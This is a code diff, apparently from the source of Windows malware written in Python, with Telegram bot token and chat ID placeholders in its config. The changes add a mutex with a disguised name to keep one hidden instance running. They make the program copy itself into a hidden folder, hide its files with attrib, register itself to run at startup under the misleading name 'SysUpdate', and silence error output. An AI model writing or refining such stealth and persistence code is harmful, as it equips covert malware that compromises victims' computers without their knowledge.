@@ -29,6 +29,13 @@ import threading
 import ctypes
 import sys
 
+
+def single_instance_check():
+    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\SysSvcMutex")
+    if ctypes.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+        sys.exit(0)  # Another instance is already running
+
+
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
@@ -352,50 +359,41 @@ def is_process_running(path):
 COPY_MARKER = os.path.join(EXTRACT_FOLDER, ".copied_marker")
 
 def ensure_hidden_copy():
-    os.makedirs(EXTRACT_FOLDER, exist_ok=True)
-    subprocess.call(f'attrib +h "{EXTRACT_FOLDER}"', shell=True)
+    if not os.path.exists(EXTRACT_FOLDER):
+        os.makedirs(EXTRACT_FOLDER)
+        subprocess.call(f'attrib +h "{EXTRACT_FOLDER}"', shell=True)
 
-    current_path = os.path.abspath(sys.argv[0])
     dest_path = EXE_PATH
+    current_path = os.path.abspath(sys.argv[0])
 
-    if current_path.lower() != dest_path.lower():
-        if not os.path.exists(COPY_MARKER):
-            if not os.path.exists(dest_path):
-                shutil.copy2(current_path, dest_path)
-                subprocess.call(f'attrib +h "{dest_path}"', shell=True)
+    # Only copy if not already there
+    if not os.path.exists(dest_path):
+        try:
+            shutil.copy2(current_path, dest_path)
+            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
+        except Exception as e:
+            pass  # Optional: log or handle copy failure
 
-            with open(COPY_MARKER, "w") as f:
-                f.write("done")
-
-            subprocess.Popen(f'"{dest_path}"', shell=True)
-            os._exit(0)
-
-
-
-
-
-# === PERSISTENCE ===
 def persist():
     try:
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        app_name = "SysUpdate"
-        exe_path = EXE_PATH
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key_name = "SysUpdate"
 
-        # Open registry key for write
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
 
         try:
-            current_value, _ = winreg.QueryValueEx(reg_key, app_name)
+            current_value, _ = winreg.QueryValueEx(reg_key, key_name)
         except FileNotFoundError:
             current_value = None
 
-        if current_value != exe_path:
-            winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, exe_path)
+        # Always make sure hidden EXE is set in registry
+        if current_value != EXE_PATH:
+            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, EXE_PATH)
 
         winreg.CloseKey(reg_key)
-
     except Exception as e:
-        print(f"[!] Persistence error: {e}")
+        pass  # Optional: log or print
+
 
 
 
@@ -632,6 +630,9 @@ def run():
 
     persist()  # ← this ensures registry is always pointing to hidden exe
     fake_input()
+    if os.path.abspath(sys.argv[0]).lower() == EXE_PATH.lower():
+        single_instance_check()  # Only enforce one hidden instance
+
 
     while True:
         time.sleep(10)
